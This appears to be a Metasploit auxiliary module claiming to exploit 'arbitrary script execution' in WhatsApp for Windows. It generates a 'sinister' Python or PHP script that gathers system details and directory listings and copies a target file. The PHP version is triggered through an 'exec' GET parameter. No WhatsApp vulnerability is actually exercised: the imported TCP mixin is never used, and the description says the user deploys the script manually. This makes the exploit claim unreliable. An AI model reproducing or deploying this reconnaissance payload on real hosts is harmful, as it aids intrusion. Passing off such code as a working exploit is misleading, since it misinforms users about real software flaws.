##
# This module requires Metasploit: https://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

require 'msf/core'

class MetasploitModule < Msf::Auxiliary
  include Msf::Exploit::Remote::Tcp

  def initialize(info = {})
    super(update_info(info,
      'Name'           => 'WhatsApp for Windows Arbitrary Script Execution',
      'Description'    => %q{
        This Metasploit module exploits a vulnerability in WhatsApp for Windows that allows the execution of arbitrary Python or PHP scripts. The module generates a script and saves it to a specified location. The user can then deploy this script to the target system running WhatsApp for Windows.
      },
      'Author'         => [ 'Isotaka Nobomaro' ],
      'License'        => MSF_LICENSE,
      'References'     => [ ['URL', 'https://github.com/isotaka134/whatsapp_windows'] ]
    ))

    register_options(
      [
        OptString.new('SCRIPT_TYPE', [ true, 'Type of script to generate (python/php)', 'python' ]),
        OptString.new('FILE_PATH', [ true, 'Path to the file to back up', 'C:\\path\\to\\important\\file.txt' ]),
        OptString.new('OUTPUT_PATH', [ true, 'Path to save the sinister script', 'C:\\path\\to\\sinister_script' ])
      ]
    )
  end

  def run
    script_type = datastore['SCRIPT_TYPE']
    file_path = datastore['FILE_PATH']
    output_path = datastore['OUTPUT_PATH']

    if script_type == 'python'
      script_content = generate_python_script(file_path)
      script_extension = '.py'
    elsif script_type == 'php'
      script_content = generate_php_script(file_path)
      script_extension = '.php'
    else
      print_error("Unsupported script type: #{script_type}")
      return
    end

    save_script("#{output_path}#{script_extension}", script_content)
  end

  def save_script(script_path, content)
    print_status("Saving script to #{script_path}")
    File.open(script_path, 'w') do |file|
      file.write(content)
    end
    print_good("sinister script saved to #{script_path}")
  end

  def generate_python_script(file_path)
    <<~PYTHON
      import os
      import platform
      import shutil

      def system_info():
          try:
              info = f"System: {platform.system()}\\n"
              info += f"Node Name: {platform.node()}\\n"
              info += f"Release: {platform.release()}\\n"
              info += f"Version: {platform.version()}\\n"
              info += f"Machine: {platform.machine()}\\n"
              info += f"Processor: {platform.processor()}\\n"
              return info
          except Exception as e:
              return str(e)

      def gather_files():
          try:
              files = os.listdir('.')
              return '\\n'.join(files)
          except Exception as e:
              return str(e)

      def create_backup(file_path):
          try:
              shutil.copy(file_path, file_path + '.bak')
              return f"Backup created for {file_path}"
          except Exception as e:
              return str(e)

      if __name__ == "__main__":
          info = system_info()
          files = gather_files()
          backup = create_backup("#{file_path}")
          print(info)
          print(files)
          print(backup)
    PYTHON
  end

  def generate_php_script(file_path)
    <<~PHP
      <?php
      function system_info() {
          $info = "System: " . php_uname() . "\\n";
          return $info;
      }

      function gather_files() {
          $files = scandir('.');
          return implode("\\n", $files);
      }

      function create_backup($file_path) {
          try {
              copy($file_path, $file_path . '.bak');
              return "Backup created for " . $file_path;
          } catch (Exception $e) {
              return $e->getMessage();
          }
      }

      if (isset($_GET['exec'])) {
          $info = system_info();
          $files = gather_files();
          $backup = create_backup('#{file_path}');
          echo $info . "\\n" . $files . "\\n" . $backup;
      }
      ?>
    PHP
  end
end

